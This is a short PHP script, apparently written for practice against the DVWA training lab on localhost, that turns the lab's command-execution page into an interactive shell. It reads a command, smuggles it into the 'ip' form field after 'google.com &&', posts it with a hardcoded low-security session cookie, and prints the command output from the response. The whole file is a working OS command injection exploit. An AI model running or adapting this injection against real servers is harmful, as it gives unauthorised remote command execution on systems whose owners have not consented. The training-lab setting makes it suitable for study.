<?php
require 'vendor/autoload.php';
use \GuzzleHttp\Psr7\Request;
use  \GuzzleHttp\Client;

// color 
$resetColor = "\e[39m";
$greenColor = "\e[0;32m";


$client = new Client();
$url = "http://localhost:8080/DVWA-master/vulnerabilities/exec/";
$command =  readline("$ ");
$headers = ['headers' => ['Cookie' => 'security=low; __stripe_mid=37d68129-f74e-428b-90ce-72715d2b34fa; PHPSESSID=jl8h4o0kvofc4nji8okhbjpc4e'],'form_params' => [
    'ip' => "google.com && " . $command,
    'Submit' => 'Submit'
]];


$response  = $client->request("POST" , $url , $headers);

$dom = new DOMDocument();
        @$dom->loadHTML($response->getBody());
        $pres = $dom->getElementsByTagName('pre');
        
        foreach($pres as $pre) :
            $pre_text = $pre->textContent;
            $text = substr($pre_text, 474,);
            echo "\033[33m$text \033[0m\n";
        endforeach;
        echo $resetColor;

?>